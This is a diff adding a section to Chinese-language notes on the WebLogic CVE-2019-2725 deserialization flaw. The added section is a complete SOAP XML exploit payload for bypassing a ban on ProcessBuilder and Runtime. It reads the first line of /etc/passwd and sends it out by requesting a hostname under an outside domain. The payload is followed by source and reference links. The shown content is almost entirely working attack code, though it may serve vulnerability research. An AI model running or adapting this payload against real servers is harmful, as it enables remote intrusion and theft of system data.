@@ -244,6 +244,67 @@ poc（加载自定义类）:
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
+### 特殊类被禁用条件下的绕过
+`java.lang.ProcessBuilder`和`java.lang.Runtime`类被禁用时，
+```
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>demo</wsa:Action><wsa:RelatesTo>test</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java>
+    <class>
+        <string>org.slf4j.ext.EventData</string>
+        <void>
+            <string><![CDATA[
+                <java>
+                    <object id="file" class="java.io.FileReader">
+                        <string>/etc/passwd</string>
+                    </object>
+                    <object id="text" class="java.io.BufferedReader">
+                        <object idref="file" />
+                        <void id="res" method="readLine"/>
+                    </object>
+                    <object idref="res">
+                        <void id="res2" method="replace">
+                            <string>:</string>
+                            <string>-</string>
+                        </void>
+                    </object>
+                    <object idref="res2">
+                        <void id="res3" method="replace">
+                            <string>/</string>
+                            <string>-</string>
+                        </void>
+                    </object>
+                    <object id="zhp" class="java.lang.String">
+                        <string>http://</string>
+                    </object>
+                    <object idref="zhp">
+                        <void id="res4" method="concat" >
+                            <object idref="res3" />
+                        </void>
+                    </object>
+                    <object idref="res4">
+                        <void id="res5" method="concat" >
+                            <string>.hack.zombiehelp54.me</string>
+                        </void>
+                    </object>
+                    <object id="url" class="java.net.URL">
+                        <object idref="res5" /></object>
+                    <object idref="url">
+                        <void id="connection" method="openConnection" />
+                    </object>
+                    <object idref="connection">
+                        <void id="inputStream" method="getInputStream"/>
+                    </object>
+                </java>
+            ]]></string>
+        </void>
+    </class>
+</java>
+</work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope> 
+```
+
+来源：
+- https://blog.cybercastle.io/weblogic-remote-code-execution-exploiting-cve-2019-2725/
+
 
 参考：
 - [Weblogic-CVE-2019-2725分析通杀poc](https://p0rz9.github.io/2019/05/22/Weblogic-CVE-2019-2725%E5%88%86%E6%9E%90%E9%80%9A%E6%9D%80poc/)
